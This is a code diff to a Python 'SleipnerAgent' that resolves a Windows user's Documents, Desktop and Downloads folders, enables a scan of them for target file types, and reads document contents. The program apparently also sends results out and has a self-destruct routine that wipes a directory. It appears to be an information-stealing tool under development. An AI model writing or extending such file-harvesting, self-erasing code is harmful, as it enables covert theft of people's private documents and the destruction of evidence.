@@ -1,4 +1,7 @@
 import sys, os, random, locale, tempfile, subprocess, textwrap
+import ctypes, uuid
+from ctypes import wintypes
+from pathlib import Path
 
 SAFE_MODE = True
 
@@ -44,13 +47,14 @@ class SleipnerAgent:
             #     self.give_agent_language_knowledge(system_language)
 
             self.determine_system_language_v2()
+            self.enviroment_directory_paths = self.determine_system_directory()
 
-            # self._scan_files()
-            # print(f"{len(self.potential_targets)} files found.")
+            self._scan_files(self.enviroment_directory_paths)
+            print(f"{len(self.potential_targets)} files found.")
             # self._analyze_files()
             
             # WARNING - DO NOT RUN THIS FUNCTION, IT WILL WIPE THE DIRECTORY
-            self.self_destruct()
+            # self.self_destruct()
 
         else:
             self.send_results()
@@ -300,6 +304,53 @@ class SleipnerAgent:
         print(f"System language: {lang_code}")
 
         return lang_code
+    
+    def determine_system_directory(self):
+        """
+        Scan the system and create a dictionary with windows paths for documents, desktop and downloads folders.
+        """
+        results = {}
+
+        # Windows HRESULT is just a 32-bit signed integer
+        HRESULT = ctypes.c_long
+
+        # Map of known folder names to their GUIDs
+        _KNOWNFOLDERIDS = {
+            "documents":  "FDD39AD0-238F-46AF-ADB4-6C85480369C7",
+            "desktop":    "B4BFCC3A-DB2C-424C-B029-7FE99A87C641",
+            "downloads":  "374DE290-123F-4565-9164-39C4925E467B",
+        }
+
+        def _get_known_folder(name: str) -> Path:
+            guid_bytes = uuid.UUID(_KNOWNFOLDERIDS[name.lower()]).bytes_le
+            guid_buffer = (ctypes.c_byte * 16).from_buffer_copy(guid_bytes)
+
+            # Get a pointer to the buffer's first byte
+            guid_ptr = ctypes.cast(guid_buffer, ctypes.POINTER(ctypes.c_byte))
+
+            SHGetKnownFolderPath = ctypes.windll.shell32.SHGetKnownFolderPath
+            SHGetKnownFolderPath.argtypes = [
+                ctypes.POINTER(ctypes.c_byte),  # REFKNOWNFOLDERID
+                wintypes.DWORD,                 # dwFlags
+                wintypes.HANDLE,                # hToken
+                ctypes.POINTER(ctypes.c_wchar_p)  # out PWSTR*
+            ]
+            SHGetKnownFolderPath.restype = HRESULT
+
+            path_ptr = ctypes.c_wchar_p()
+            hr = SHGetKnownFolderPath(guid_ptr, 0, None, ctypes.byref(path_ptr))
+            if hr != 0:
+                raise ctypes.WinError(hr)
+
+            try:
+                return Path(path_ptr.value)
+            finally:
+                ctypes.windll.ole32.CoTaskMemFree(path_ptr)
+
+        for location in _KNOWNFOLDERIDS.keys():
+            results[location] = _get_known_folder(location)
+
+        return results
 
     def _read_docx(self, file_path):
 
@@ -353,7 +404,6 @@ class SleipnerAgent:
             print(f"Error reading PDF: {str(e)}")
             return ""
 
-
     def _read_odt(self, file_path) -> str:
         packages_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'libs', 'packages')
         sys.path.insert(0, packages_path)
@@ -381,10 +431,9 @@ class SleipnerAgent:
             print(f"Error reading ODT file: {str(e)}")
             return ""
 
-
-    def _scan_files(self, directory=None, filetypes=None):
+    def _scan_files(self, directory_paths, directory=None, filetypes=None):
         # Get all text files in the system
-        self.potential_targets = self.lantern.sense_surroundings(directory, filetypes)
+        self.potential_targets = self.lantern.sense_surroundings(directory_paths, directory, filetypes)
 
     def _analyze_files(self):
         if not self.potential_targets:
@@ -461,28 +510,30 @@ class Lantern:
     def __init__(self):
         self.wanted_filetypes = TARGET_FILETYPES
 
-    def _shine_lantern(self, directory=None, filetypes=None) -> list:
-        user_home = os.path.expanduser("~")
+    def _shine_lantern(self, directory_paths, directory=None, filetypes=None) -> list:
+        """
+        Scans target directories for files matching self.wanted_filetypes.
+        Uses resolved system paths from self.enviroment_directory_paths.
+        """
 
-        if filetypes:
-            self.wanted_filetypes = filetypes
-        else:
-            self.wanted_filetypes = TARGET_FILETYPES
+        self.enviroment_directory_paths = directory_paths
+        # Use custom filetypes if given
+        self.wanted_filetypes = filetypes or TARGET_FILETYPES
 
         if directory:
-            root_locations = [
-                os.path.join(user_home, directory)
-            ]
-
+            # User provided a subdirectory to scan under their home folder
+            root_locations = [os.path.join(os.path.expanduser("~"), directory)]
         else:
-            root_locations = [
-                os.path.join(user_home, "Documents"),
-                os.path.join(user_home, "Desktop"),
-                os.path.join(user_home, "Downloads")
-            ]
+            # Use system-resolved paths for documents, desktop, downloads
+            root_locations = list(self.enviroment_directory_paths.values())
 
         candidate_files = []
+
         for location in root_locations:
+            location = str(location)  # Ensure compatibility with os.walk
+            if not os.path.exists(location):
+                continue
+
             for root, _, filenames in os.walk(location):
                 path_parts = os.path.normpath(root).split(os.sep)
                 if 'venv' in path_parts:
@@ -491,11 +542,11 @@ class Lantern:
                 candidate_files.extend([
                     os.path.join(root, f)
                     for f in filenames
-                    if "." in f and f.split(".")[-1] in self.wanted_filetypes
+                    if "." in f and f.rsplit(".", 1)[-1].lower() in self.wanted_filetypes
                 ])
 
         return candidate_files
     
-    def sense_surroundings(self, directory=None, filetypes=None) -> list:
-        relevant_content = self._shine_lantern(directory, filetypes)
+    def sense_surroundings(self, directory_filepaths, directory=None, filetypes=None) -> list:
+        relevant_content = self._shine_lantern(directory_filepaths, directory, filetypes)
         return relevant_content
